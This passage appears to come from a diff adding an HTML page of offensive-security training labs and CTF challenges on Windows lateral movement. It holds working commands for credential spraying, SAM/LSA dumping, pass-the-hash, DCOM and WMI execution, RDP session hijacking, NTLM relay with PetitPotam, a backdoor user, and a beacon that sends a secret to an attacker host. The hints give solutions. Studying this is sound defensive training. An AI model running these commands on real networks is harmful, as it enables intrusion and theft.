+# 1. Connects via DCOM (port 135 → dynamic port)
+# 2. Creates a Win32_Process via WMI
+# 3. Redirects output to a temp file on ADMIN$ share
+# 4. Reads the output file and deletes it
+# No service created — less forensic artifacts</code></pre>
+<pre><code class="language-bash"># Compare with other WMI methods:
+# impacket-dcomexec — uses different DCOM objects (ShellWindows, MMC20)
+impacket-dcomexec -object ShellWindows corp.local/admin:'Password123'@10.10.10.10
+
+# impacket-atexec — uses Task Scheduler (less common, different artifacts)
+impacket-atexec corp.local/admin:'Password123'@10.10.10.10 "whoami"</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Get a shell using wmiexec. Compare the artifacts with psexec (no service, no binary).</li>
+              <li>Test dcomexec with different DCOM objects — which work depends on the target config.</li>
+              <li>Use atexec for one-shot command execution via scheduled tasks.</li>
+              <li>Monitor network traffic: identify the DCOM negotiation on port 135.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 6: Evil-WinRM Advanced Usage</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Master evil-winrm features: file transfer, PowerShell module loading, DLL loading, and Kerberos authentication.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Basic connection
+evil-winrm -i 10.10.10.10 -u admin -p 'Password123'
+
+# Pass-the-Hash
+evil-winrm -i 10.10.10.10 -u admin -H NTLM_HASH
+
+# Kerberos authentication
+evil-winrm -i dc01.corp.local -r corp.local
+
+# Load PowerShell scripts from a directory (-s flag)
+evil-winrm -i 10.10.10.10 -u admin -p 'Password123' -s /opt/tools/ps/
+
+# Load DLLs (-e flag for executables directory)
+evil-winrm -i 10.10.10.10 -u admin -p 'Password123' -e /opt/tools/exe/
+
+# Once connected:
+*Evil-WinRM* PS> upload /tmp/winpeas.exe C:\temp\winpeas.exe
+*Evil-WinRM* PS> download C:\Users\admin\flag.txt /tmp/flag.txt
+*Evil-WinRM* PS> menu         # show available commands
+*Evil-WinRM* PS> Invoke-Binary /opt/tools/Rubeus.exe     # run .NET assemblies in memory</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Connect with password, upload SharpHound, run it, and download the results.</li>
+              <li>Load PowerView using the <code>-s</code> flag and run enumeration commands.</li>
+              <li>Use <code>Invoke-Binary</code> to run .NET assemblies (Rubeus, Seatbelt) without dropping to disk.</li>
+              <li>Test Kerberos authentication with a <code>.ccache</code> ticket.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 7: CrackMapExec/NetExec Enumeration</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Use CrackMapExec (nxc) for network-wide enumeration, credential spraying, and post-exploitation across SMB, WinRM, LDAP, and MSSQL.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># SMB enumeration
+nxc smb 10.10.10.0/24                                          # discover hosts
+nxc smb 10.10.10.0/24 -u admin -p 'Password123'                # test creds
+nxc smb 10.10.10.0/24 -u admin -H NTLM_HASH                   # PtH
+nxc smb 10.10.10.0/24 -u admin -p 'Password123' --shares       # list shares
+nxc smb 10.10.10.10 -u admin -p 'Password123' --sam            # dump SAM
+nxc smb 10.10.10.10 -u admin -p 'Password123' --lsa            # dump LSA
+nxc smb 10.10.10.10 -u admin -p 'Password123' -x "whoami"      # exec command
+nxc smb 10.10.10.10 -u admin -p 'Password123' --spider C$      # spider shares
+
+# WinRM
+nxc winrm 10.10.10.0/24 -u admin -p 'Password123'
+
+# LDAP
+nxc ldap 10.10.10.10 -u admin -p 'Password123' --users
+nxc ldap 10.10.10.10 -u admin -p 'Password123' --groups
+nxc ldap 10.10.10.10 -u admin -p 'Password123' --kerberoasting
+
+# MSSQL
+nxc mssql 10.10.10.0/24 -u sa -p 'SAPassword123'
+nxc mssql 10.10.10.10 -u sa -p 'SAPassword123' -x "whoami"</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Discover all SMB-enabled hosts on the subnet.</li>
+              <li>Spray credentials and identify where you have admin access (Pwn3d!).</li>
+              <li>Dump SAM hashes from a pwned host and use them to pivot further.</li>
+              <li>Use LDAP modules to enumerate users and Kerberoastable accounts.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 8: Ligolo-ng Pivoting</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Use ligolo-ng as a modern alternative to chisel for creating tunnels through compromised hosts — provides a full TUN interface for seamless pivoting.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Step 1: Set up on attacker machine
+# Create TUN interface
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+
+# Start ligolo proxy
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+# Step 2: On the compromised pivot host
+# Upload and run the agent
+.\agent.exe -connect ATTACKER_IP:11601 -ignore-cert
+
+# Step 3: Back on attacker — configure routing
+# In ligolo proxy console:
+>> session                               # select the agent session
+>> ifconfig                              # view the agent's network interfaces
+>> start                                 # start the tunnel
+
+# Add route to the internal network
+sudo ip route add 172.16.1.0/24 dev ligolo
+
+# Step 4: Now directly access the internal network — no proxychains needed!
+nmap -sT -p 445,3389,5985 172.16.1.0/24
+evil-winrm -i 172.16.1.10 -u admin -p 'Password123'
+impacket-psexec admin:'Password123'@172.16.1.10</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Set up ligolo-ng with the TUN interface on your attacker machine.</li>
+              <li>Deploy the agent on the pivot host and establish the tunnel.</li>
+              <li>Scan the internal network directly (no proxychains required).</li>
+              <li>Compare the experience with chisel SOCKS — ligolo is faster and more transparent.</li>
+              <li>Set up a listener on the agent for reverse shells from internal hosts.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 9: SSH Port Forwarding</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Use SSH local, remote, and dynamic port forwarding for pivoting when SSH is available on the pivot host.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Local port forward: access internal_host:445 via localhost:4445
+ssh -L 4445:172.16.1.10:445 user@pivot_host
+# Now connect to SMB on internal host:
+smbclient //localhost:4445/share -U admin
+
+# Remote port forward: expose attacker's port 8080 on pivot host
+ssh -R 8080:localhost:80 user@pivot_host
+# Internal hosts can reach your web server via pivot_host:8080
+
+# Dynamic port forward: full SOCKS proxy
+ssh -D 1080 user@pivot_host
+# Configure proxychains to use socks5://127.0.0.1:1080
+proxychains nmap -sT -Pn 172.16.1.0/24
+
+# Multiple forwards in one connection
+ssh -L 4445:172.16.1.10:445 -L 5985:172.16.1.10:5985 -D 1080 user@pivot_host
+
+# sshuttle: transparent proxy (no SOCKS needed)
+sshuttle -r user@pivot_host 172.16.1.0/24 --dns</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Set up a local port forward to access an internal SMB share.</li>
+              <li>Set up a dynamic port forward (SOCKS5) and scan the internal network via proxychains.</li>
+              <li>Use sshuttle for transparent routing — compare with manual port forwards.</li>
+              <li>Create a multi-hop SSH tunnel through two pivot hosts.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 10: DCOM Execution</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Execute commands on remote machines using DCOM objects — an alternative to PSExec/WMI that leaves different forensic artifacts.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Method 1: MMC20.Application (Excel/Word not needed)
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1", "10.10.10.10"))
+$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\temp\output.txt", "7")
+
+# Method 2: ShellWindows (explorer.exe must be running)
+$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "10.10.10.10"))
+$item = $com.Item()
+$item.Document.Application.ShellExecute("cmd.exe", "/c whoami > C:\temp\output.txt", "", $null, 0)
+
+# Method 3: ShellBrowserWindow
+$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10"))
+$com.Document.Application.ShellExecute("cmd.exe", "/c net user hacker Hacker123! /add", "", $null, 0)</code></pre>
+<pre><code class="language-bash"># impacket-dcomexec
+impacket-dcomexec -object MMC20 corp.local/admin:'Password123'@10.10.10.10
+impacket-dcomexec -object ShellWindows corp.local/admin:'Password123'@10.10.10.10
+impacket-dcomexec -object ShellBrowserWindow corp.local/admin:'Password123'@10.10.10.10</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Test each DCOM method — note which work based on the target configuration.</li>
+              <li>Compare forensic artifacts with PSExec (no service, no binary, but DCOM events).</li>
+              <li>Attempt DCOM execution with PtH using impacket-dcomexec.</li>
+              <li>Monitor Event Viewer on the target for DCOM-related events (Event ID 10028).</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 11: RDP Hijacking</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Hijack an existing disconnected RDP session without credentials using SYSTEM-level access and <code>tscon</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Prerequisite: SYSTEM access on the target (via psexec, service, etc.)
+
+# Step 1: List all sessions (look for disconnected ones)
+query user
+# USERNAME     SESSIONNAME   ID  STATE    IDLE TIME  LOGON TIME
+# admin        rdp-tcp#1      1  Disc          10   7/15/2024 9:00 AM
+# you          console        2  Active             7/15/2024 10:00 AM
+
+# Step 2: As SYSTEM, connect to the disconnected session (no password needed!)
+# Create a service that runs tscon (must run as SYSTEM)
+sc create sesshijack binPath= "cmd.exe /k tscon 1 /dest:console"
+net start sesshijack
+
+# Or if you already have a SYSTEM shell:
+tscon 1 /dest:console
+
+# This switches your console to admin's RDP session — full access, no auth</code></pre>
+<pre><code class="language-bash"># From Linux — use impacket-psexec to get SYSTEM, then hijack
+impacket-psexec -hashes :HASH Administrator@10.10.10.10
+# In the SYSTEM shell:
+query user
+tscon TARGET_SESSION_ID /dest:rdp-tcp#YOUR_SESSION</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Get SYSTEM access on a machine with disconnected RDP sessions.</li>
+              <li>Enumerate sessions with <code>query user</code> and identify disconnected ones.</li>
+              <li>Use <code>tscon</code> to hijack the session.</li>
+              <li>Discuss detection: what events are logged when tscon is used?</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 12: SMB Relay and SOCKS Proxy</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Relay captured NTLM authentication to targets with SMB signing disabled, using ntlmrelayx with SOCKS for persistent access.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Step 1: Identify targets with SMB signing disabled
+nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
+cat relay_targets.txt
+
+# Step 2: Start ntlmrelayx with SOCKS
+impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks
+
+# Step 3: Trigger authentication (choose a method)
+# PetitPotam (MS-EFSRPC)
+python3 PetitPotam.py ATTACKER_IP 10.10.10.30
+
+# PrinterBug (MS-RPRN)
+python3 printerbug.py corp.local/user:pass@10.10.10.30 ATTACKER_IP
+
+# Responder (passive — wait for broadcast traffic)
+sudo responder -I eth0 -dwPv
+
+# Step 4: Use relayed sessions via SOCKS proxy
+# ntlmrelayx shows: "10.10.10.30 - SOCKS session established"
+proxychains impacket-smbclient //10.10.10.20 -U corp/admin
+proxychains nxc smb 10.10.10.20 -u admin -p '' --sam</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Scan the network for targets with SMB signing disabled.</li>
+              <li>Start ntlmrelayx with SOCKS and trigger authentication via PetitPotam.</li>
+              <li>Use the relayed session through proxychains to enumerate and dump credentials.</li>
+              <li>Try relaying to different services: SMB, LDAP, HTTP.</li>
+              <li>Discuss mitigation: how does enabling SMB signing prevent relay attacks?</li>
+            </ol>
+          </div>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- CTF TAB                                                      -->
+      <!-- ============================================================ -->
+      <div class="tab-content" id="ctf">
+        <h2>CTF Challenges</h2>
+
+        <div class="ctf-card">
+          <h4>Challenge 1: The Hash Relay</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">You've compromised a workstation and extracted the local admin NTLM hash. The flag is in <code>C:\flag.txt</code> on a second machine (10.10.10.20) that reuses the same local admin password.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Environment:
+#   Compromised host: 10.10.10.10
+#   Target: 10.10.10.20
+#   Dumped hash: Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+#
+# Use the hash to move laterally and read the flag</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>1. Verify the hash works on the target: <code>nxc smb 10.10.10.20 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b</code><br>
+            2. Get a shell: <code>impacket-psexec -hashes :64f12cddaa88057e06a81b54e73b949b Administrator@10.10.10.20</code><br>
+            3. Read the flag: <code>type C:\flag.txt</code></p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 2: Through the Tunnel</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">You have a shell on a perimeter server (10.10.10.50). An internal host at 172.16.1.100 has a web service on port 8080 with a flag. The internal network is not directly routable from your machine.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Environment:
+#   Attacker: 192.168.1.100
+#   Pivot host: 10.10.10.50 (external: 10.10.10.50 / internal: 172.16.1.50)
+#   Target: 172.16.1.100:8080 — web service with flag
+#   Pivot creds: user / Pivot2024!
+#
+# Reach the internal web service and retrieve the flag</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Option A — SSH tunnel:</strong><br>
+            <code>ssh -L 8080:172.16.1.100:8080 user@10.10.10.50</code><br>
+            Then browse to <code>http://localhost:8080</code>.<br><br>
+            <strong>Option B — Chisel:</strong><br>
+            Attacker: <code>chisel server --reverse --port 9090</code><br>
+            Pivot: <code>chisel client 192.168.1.100:9090 R:socks</code><br>
+            Then: <code>proxychains curl http://172.16.1.100:8080</code><br><br>
+            <strong>Option C — sshuttle:</strong><br>
+            <code>sshuttle -r user@10.10.10.50 172.16.1.0/24</code><br>
+            Then: <code>curl http://172.16.1.100:8080</code></p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 3: Full Chain — From the Outside In</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Starting from an external network with no credentials, gain initial access to the DMZ, escalate privileges, pivot into the corporate network, and read the flag from the Domain Controller.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Environment:
+#   External: 10.10.10.0/24
+#   DMZ: 172.16.1.0/24 (reachable only from 10.10.10.0/24)
+#   Corporate: 172.16.2.0/24 (reachable only from 172.16.1.0/24)
+#   DC: 172.16.2.10 — flag in C:\Users\Administrator\Desktop\flag.txt
+#
+# Attack stages:
+#   1. Scan 10.10.10.0/24 → find web server with RCE vulnerability
+#   2. Get shell on DMZ web server → escalate to root/admin
+#   3. Pivot to 172.16.1.0/24 → find a Windows workstation
+#   4. Dump credentials → PtH to reach DC in 172.16.2.0/24
+#   5. Read the flag
+
+# Start
+nmap -sT -Pn -p 80,443,445,3389 10.10.10.0/24</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Stage 1 — Initial Access:</strong> Scan reveals a web server at 10.10.10.30:80. Exploit an RCE vuln (command injection, file upload, deserialization) to get a shell.<br>
+            <strong>Stage 2 — Privesc:</strong> Enumerate with linpeas/winpeas. Find stored credentials or a kernel exploit. Escalate to root/SYSTEM.<br>
+            <strong>Stage 3 — First Pivot:</strong> Set up chisel or ligolo-ng on the DMZ host. Route traffic to 172.16.1.0/24. Scan and find a Windows workstation at 172.16.1.20 with SMB open.<br>
+            <strong>Stage 4 — Credential Harvest:</strong> Through proxychains, use nxc to test found creds on 172.16.1.20. Get a shell, run mimikatz, dump NTLM hashes. Find a domain admin hash.<br>
+            <strong>Stage 5 — Double Pivot:</strong> Set up a second tunnel from 172.16.1.20 to reach 172.16.2.0/24. PtH with the domain admin hash to the DC: <code>proxychains impacket-psexec -hashes :DA_HASH Administrator@172.16.2.10</code><br>
+            <strong>Stage 6:</strong> <code>type C:\Users\Administrator\Desktop\flag.txt</code></p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 4: Pivot Through the Network</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">You've compromised a web server at 10.10.10.30. An internal database at 172.16.1.50 has the flag on port 3306 (MySQL). The internal network is only reachable from the web server.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Environment:
+#   Attacker: 192.168.1.100
+#   Web server: 10.10.10.30 (SSH access: webadmin / W3bAdmin!)
+#   Internal: 10.10.10.30 has second NIC at 172.16.1.30
+#   Target: 172.16.1.50:3306 (MySQL, creds: dbuser / DbPass123)
+#
+# The flag is in the "secrets" table of the "ctf" database</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Set up a local port forward: <code>ssh -L 3306:172.16.1.50:3306 webadmin@10.10.10.30</code>. Then connect to MySQL via localhost: <code>mysql -h 127.0.0.1 -u dbuser -p'DbPass123' ctf -e "SELECT * FROM secrets"</code>. Alternative: use chisel or ligolo-ng for a full SOCKS proxy to access the entire 172.16.1.0/24 network.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 5: Multi-Hop Tunneling</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">The flag is three network hops away. Pivot through two intermediate hosts to reach the final target. No single host can reach the flag directly.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Network topology:
+#   Attacker → Host A (10.10.10.20) → Host B (172.16.1.20) → Target (192.168.100.10)
+#
+#   Host A creds: user_a / PassA!  (has NIC on 10.10.10.0/24 + 172.16.1.0/24)
+#   Host B creds: user_b / PassB!  (has NIC on 172.16.1.0/24 + 192.168.100.0/24)
+#   Target: 192.168.100.10 — flag at C:\flag.txt (SMB share, creds: admin / FinalPass!)
+#
+# Build a chain of tunnels to reach the target</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Chisel chain:</strong> Attacker: <code>chisel server --reverse -p 8080</code>. Host A: <code>chisel client ATTACKER:8080 R:socks</code> + <code>chisel server --reverse -p 9090 --socks5</code>. Host B (through proxychains): <code>proxychains chisel client HOST_A_INTERNAL:9090 R:1081:socks</code>. Configure proxychains with two SOCKS proxies chained. <strong>SSH approach:</strong> <code>ssh -J user_a@10.10.10.20 user_b@172.16.1.20 -L 4445:192.168.100.10:445</code> (ProxyJump for multi-hop). Then <code>smbclient //localhost:4445/C$ -U admin</code>.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 6: Credential Relay Race</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Two servers on the network have SMB signing disabled. Capture and relay authentication from one to the other. The relayed session gives you access to a share containing the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Environment:
+#   Attacker: 192.168.1.100
+#   Server A: 10.10.10.40 (will initiate auth — you can trigger via PetitPotam)
+#   Server B: 10.10.10.50 (SMB signing disabled — relay target)
+#   Server A's machine account has read access to \\Server_B\secrets share
+#
+# Relay A's authentication to B and read the flag from the share</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Start ntlmrelayx targeting Server B: <code>impacket-ntlmrelayx -t smb://10.10.10.50 -smb2support -socks</code>. Trigger Server A to authenticate to you: <code>python3 PetitPotam.py 192.168.1.100 10.10.10.40</code>. Server A's machine account auth is relayed to Server B. Use the SOCKS session: <code>proxychains smbclient //10.10.10.50/secrets -U 'CORP/SERVER_A$'</code>. Read the flag from the share.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 7: DCOM Execution Challenge</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">PSExec and WMI are blocked by the firewall. Only DCOM (port 135 + dynamic ports) is allowed. Use DCOM to execute a command on the target and read the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Environment:
+#   Target: 10.10.10.10
+#   Creds: corp\admin / Admin2024!
+#   Port 445 is BLOCKED (no PSExec)
+#   Port 5985 is BLOCKED (no WinRM)
+#   Port 135 is OPEN (DCOM available)
+#   Flag: C:\Users\admin\Desktop\flag.txt</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Use impacket-dcomexec with the MMC20 object: <code>impacket-dcomexec -object MMC20 corp.local/admin:'Admin2024!'@10.10.10.10 "type C:\Users\admin\Desktop\flag.txt"</code>. If MMC20 doesn't work, try ShellWindows or ShellBrowserWindow objects. From PowerShell: <code>$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.10.10.10")); $com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c type C:\Users\admin\Desktop\flag.txt > C:\temp\out.txt","7")</code>, then read the output.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 8: RDP Session Hijacking</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">You have SYSTEM on a server. A Domain Admin has a disconnected RDP session. Hijack their session and read the flag from their desktop.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># You have: SYSTEM shell on 10.10.10.10
+# Enumerate sessions
+query user
+# USERNAME     SESSIONNAME   ID  STATE
+# da_admin                    3  Disc
+# your_user   rdp-tcp#5      5  Active
+#
+# The DA has a disconnected session (ID 3)
+# Flag: open on their desktop in a notepad window</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>As SYSTEM, use <code>tscon</code> to hijack the disconnected session: <code>tscon 3 /dest:rdp-tcp#5</code>. This redirects session 3 (da_admin) to your RDP session. You'll see their full desktop, including the open notepad with the flag. If tscon complains, create a service: <code>sc create hijack binPath= "cmd /k tscon 3 /dest:rdp-tcp#5"</code> and start it. No password is required since you're running as SYSTEM.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 9: C2 Beacon Deployment</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Deploy a simple C2 beacon on an internal host through a pivot. The beacon must call back through the tunnel to your attacker machine. The flag is returned in the beacon's first callback.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Environment:
+#   Attacker: 192.168.1.100
+#   Pivot: 10.10.10.30 (compromised, SSH access)
+#   Internal target: 172.16.1.20 (Windows, WinRM open)
+#   Target creds: corp\svc_app / AppSvc2024!
+#
+# Challenge: Deploy a PowerShell beacon that calls back to your HTTP listener
+# The beacon must traverse: Internal → Pivot → Attacker
+# Flag is in the environment variable FLAG on the target</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Set up a reverse port forward so the internal host can reach your listener: <code>ssh -R 8443:localhost:8443 user@10.10.10.30</code>. Start an HTTP listener on your machine (port 8443). Connect to the target via the pivot: <code>proxychains evil-winrm -i 172.16.1.20 -u svc_app -p 'AppSvc2024!'</code>. On the target, run: <code>$flag = $env:FLAG; Invoke-WebRequest -Uri "http://10.10.10.30:8443/$flag" -UseBasicParsing</code>. The flag arrives at your HTTP listener in the URL path. The callback routes: target → pivot (port 8443) → SSH tunnel → attacker.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 10: LOLBAS Lateral Movement</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">All offensive tools (psexec, mimikatz, evil-winrm) are blocked by the EDR. Use only Living Off The Land Binaries and Scripts (LOLBAS) to move laterally and read the flag on the target.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Environment:
+#   Source: Your compromised workstation (domain-joined)
+#   Target: 10.10.10.20 (file server, you have admin creds)
+#   Creds: corp\admin / Admin123!
+#   EDR blocks: psexec, mimikatz, cobalt strike, evil-winrm, ncat, chisel
+#   Flag: C:\Shares\Confidential\flag.txt on the target
+#
+# Only built-in Windows tools are available</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>LOLBAS approaches: (1) <strong>WinRM (built-in):</strong> <code>Enter-PSSession -ComputerName 10.10.10.20 -Credential (Get-Credential)</code>, then <code>type C:\Shares\Confidential\flag.txt</code>. (2) <strong>WMI:</strong> <code>Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c type C:\Shares\Confidential\flag.txt > C:\temp\out.txt" -ComputerName 10.10.10.20 -Credential $cred</code>, then read the output via SMB. (3) <strong>PsExec (Sysinternals, often not flagged):</strong> <code>.\PsExec.exe \\10.10.10.20 -u admin -p Admin123! cmd /c type C:\Shares\Confidential\flag.txt</code>. (4) <strong>schtasks:</strong> Create a remote scheduled task that reads the flag.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
